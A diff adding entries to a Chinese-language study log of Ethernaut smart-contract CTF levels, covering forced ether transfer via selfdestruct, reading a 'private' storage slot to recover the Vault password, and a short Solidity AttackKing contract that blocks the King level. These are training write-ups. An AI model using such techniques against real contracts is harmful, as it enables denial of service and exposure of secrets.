@@ -67,6 +67,7 @@ await contract.Fal1out()
 合约地址：0xd969Ee8f7634454a2Deb8dF8C28B0D113D536f48
 1. 有些奇怪。在remix上编译这个合约，通过地址识别实例发现是Delegate合约，而不是Delegation合约。Deletegate合约可以直接执行 pwn 方法完成owner转换。
 2. 猜测remix 无法准确识别两个合约在一个文件的情况，加上两个合约结构类似，因此可以正常调用
+
 #### Ethernaut - Force
 没有合约代码，有点不太懂
 合约地址：0x00a5b5d5717192AE7e982Ec80ea006f188ee70E3
@@ -74,5 +75,35 @@ await contract.Fal1out()
 2. 可以通过合约的 selfdestruct 方法实现强制转账
 3. 还可以通过挖矿奖励或者在合约部署之前给它转账的方式，实现强制转账
 4. 解题思路就是部署一个新合约，给它转点币，再调用它的自毁方法把币强制转给目标合约
+
+### 2024.09.01
+#### Ethernaut - Vault
+合约地址：0x723d210fD10CB30e4C26e3E74C175d035B41383C </br>
+学习如何访问合约中的 private 变量。可以通过 web3.js的方法查询
+```
+await web3.eth.getStorageAt(instance, 1)
+```
+获得值：0x412076657279207374726f6e67207365637265742070617373776f7264203a29 <br>
+解析出来是：A very strong secret password :) <br>
+值得一提的另一个解题方法是，直接反编译创建合约的字节码，也发现了： `'A very strong secret password :)'`，只是一开始以为是没用的注释，就没使用:)
+
+#### Ethernaut - King
+合约地址：0x7237a19220B624692cDC7b102204C36Cfc23B53e
+本题学习如何构造一个不接收转账的合约。
+1. 一开始正常往合约转了0.002eth，提交题目。发现被重置了king
+2. 题目中会用到 king的transfer功能，因此可以构造一个合约来给目标合约转账，新合约会成为king。但是由于新合约无法接收转账，因此提交题目时不会出现1种的重置
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AttackKing {
+
+    constructor(address king) payable {
+        (bool success, ) = king.call{value: 0.002 ether}("");
+        require(success, "call false");
+    }
+
+}
+```
 
 <!-- Content_END -->
